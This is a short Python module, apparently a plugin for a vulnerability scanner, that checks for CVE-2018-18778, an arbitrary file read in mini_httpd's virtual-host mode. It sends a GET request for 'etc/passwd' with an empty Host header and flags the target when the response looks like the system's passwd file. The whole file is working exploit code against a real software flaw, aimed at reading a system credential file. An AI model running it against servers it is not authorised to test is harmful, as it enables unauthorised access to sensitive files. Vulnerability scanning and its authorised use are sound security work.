#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2018_18778_payloads = [
    {'path': 'etc/passwd'}
]

def cve_2018_18778_scan(self, clients):
    ''' 在mini_httpd开启虚拟主机模式的情况下, 用户请求http://HOST/FILE将会访问到当前目录下的HOST/FILE文件 '''
    hackClient = clients.get('hackClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2018-18778',
    }

    headers = {
        'Host': ''
    }

    for payload in cve_2018_18778_payloads:
        path = payload['path']

        res = hackClient.request(
            'get',
            path,
            headers=headers,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
